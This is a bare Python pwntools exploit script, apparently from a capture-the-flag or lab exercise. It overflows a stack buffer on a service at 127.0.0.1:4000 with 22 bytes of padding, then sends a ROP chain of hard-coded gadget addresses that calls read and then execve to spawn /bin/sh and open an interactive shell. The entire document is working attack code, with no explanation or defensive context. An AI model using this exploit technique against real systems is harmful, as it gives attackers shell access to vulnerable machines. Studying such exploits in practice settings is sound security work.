from pwn import *

pop_eax_ret = 0x080b90f6
pop_ebx_ret = 0x080481c9
pop_ecx_ret = 0x080595b3
pop_edx_ret = 0x0806e7da
int_0x80 = 0x0806ef00
buf = 0x080ee000

rop=[
	pop_eax_ret,
	0x3,
	pop_ebx_ret,
	0,
	pop_ecx_ret,
	buf,
	pop_edx_ret,
	50,
	int_0x80,
	pop_eax_ret,
	0xb,
	pop_ebx_ret,
	buf,
	pop_ecx_ret,
	0,
	pop_edx_ret,
	0,
	int_0x80
]

c = remote('127.0.0.1', 4000)
c.sendline('a'*22 + flat(rop))
sleep(2)
c.sendline('/bin/sh\x00')
c.interactive()


